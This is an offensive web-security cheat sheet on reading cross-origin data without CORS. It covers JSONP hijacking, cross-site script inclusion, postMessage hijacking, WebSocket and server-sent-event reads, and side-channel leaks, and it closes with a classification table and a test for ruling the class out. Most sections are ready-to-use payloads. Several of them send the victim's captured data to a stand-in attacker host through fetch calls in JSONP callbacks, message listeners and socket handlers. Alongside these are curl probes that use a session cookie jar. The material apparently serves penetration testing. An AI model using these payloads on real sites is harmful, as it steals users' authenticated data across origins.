# JSONP and the alternates — cross-origin reads without CORS

Before CORS, `JSONP` and other tags read cross-origin data. When
CORS is closed, these alternates may still leak the response.

---

## 1. JSONP — the script-tag read

```html
<script src="https://t/api/me?callback=leak"></script>
<script>function leak(d){fetch('https://attacker/?d='+JSON.stringify(d))}</script>
```

A `<script src>` load executes the response as JS — a JSONP endpoint
wraps the data in a function call the page defines. The tag sends
cookies (SameSite-gated) — a GET sub-resource.

```text
the check: does the endpoint take a callback= parameter and wrap
the JSON? JSONP endpoints are a legacy shape — grep for callback/_
/jsonp.
```

## 2. The JSONP-hijack — when the endpoint IS jsonp

```bash
# does the endpoint respond to a callback param?
curl -s -b "$CJ" "$BASE/api/me?callback=x"
# 'x({"a":1})' → a JSONP endpoint — readable cross-origin via <script>
```

## 3. The `<script>`/`link`/`img` reads — the sub-resource leaks

```html
<!-- a script that contains data — a JS-file endpoint -->
<script src="https://t/config.js"></script>
<!-- config.js defines var cfg={...} — the page reads cfg after load -->

<!-- a stylesheet that leaks data -->
<link rel=stylesheet href="https://t/data.css">
<!-- the CSS rules' content is measurable via getComputedStyle
     (a partial XS-leak read) -->
```

## 4. The `<object>`/`<embed>`/`<iframe>` — a document read

```html
<object data="https://t/data"></object>
<embed src="https://t/data">
<iframe src="https://t/data"></iframe>
<!-- the embedded doc is same-origin-inaccessible BUT its side-
     channels (frame-count, resize, error) are XS-leaks -->
```

## 5. The XSSI — cross-site script inclusion

```text
an endpoint that serves data as JS (a config.js, a JSONP, a
dynamic-script) — readable via <script src>. the XSSI class overlaps
CORS: a script-served endpoint is readable without any ACAO.
```

```bash
# is the endpoint a JS file / JSONP / dynamic-script?
curl -s -b "$CJ" "$BASE/config.js" | head -5
# 'var cfg={...}' or 'callback({...})' → a script-read
```

## 6. The postMessage channel — a page that broadcasts

```html
<!-- a target page that postMessages sensitive data to '*' -->
<iframe src="https://t/page"></iframe>
<script>window.onmessage=e=>fetch('https://attacker/?d='+e.data)</script>
<!-- if the target page postMessages to '*' or an unverified origin,
     your iframe receives it — a postMessage-hijack read -->
```

## 7. The `<link rel=preload/prefetch>` — a passive fetch

```html
<link rel=preload href="https://t/data" as=fetch crossorigin>
<!-- a preload fetch — the data lands in the cache, not readable
     — a side-channel, not a CORS read -->
```

## 8. The service-worker / cache read — a stored primitive

```text
a service-worker or a cached response that leaks data cross-origin —
a stored-channel, not a direct read.
```

## 9. The WebSocket — the ws/wss read

```js
var ws=new WebSocket('wss://t/ws');
ws.onmessage=e=>fetch('https://attacker/?d='+e.data);
// a ws channel — cookies on the handshake, messages readable —
// the web-websocket class
```

## 10. The EventSource — a server-sent-events read

```js
new EventSource('https://t/stream',{withCredentials:true})
.onmessage=e=>fetch('https://attacker/?d='+e.data);
// a SSE channel — a persistent read; needs the endpoint to be SSE
// and accept cross-origin (EventSource has its own CORS check)
```

## 11. The alternate→class decision

| The read shape | The class |
|---|---|
| a JSONP/script endpoint | JSONP/XSSI — still a read (CORS-adjacent) |
| an iframe's side-channels | web-xs-leaks |
| a postMessage channel | postMessage-hijack |
| a ws channel | web-websocket |
| a CSS/stylesheet leak | web-xs-leaks |
| a fetch ACAO-open | web-cors |

## 12. The falsifier

```text
the endpoint returns no sensitive data AND isn't a JSONP/script
endpoint AND no postMessage/ws channel exists — no cross-origin
read path. the class is closed.
```
